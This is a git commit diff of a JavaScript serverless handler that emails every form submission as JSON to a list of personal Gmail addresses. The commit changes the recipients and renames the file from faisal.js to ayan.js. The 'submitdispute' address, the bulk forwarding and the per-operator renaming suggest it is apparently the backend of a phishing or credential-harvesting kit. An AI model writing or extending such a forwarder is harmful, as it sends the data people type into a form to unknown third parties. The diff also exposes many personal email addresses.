671f2df73345ab8ae2504ab4dc0d614a03bcaeb5
humain609-debug <humain609@gmail.com>
2026-04-04 19:01:58 +0500

    Update and rename faisal.js to ayan.js

--- ayan.js
+++ ayan.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,mutepanda8@gmail.com",
-      subject: "faisal",
+      to: "fahadali123gg@gmail.com,linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,bnizamani50@gmail.com",
+      subject: "ayan",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
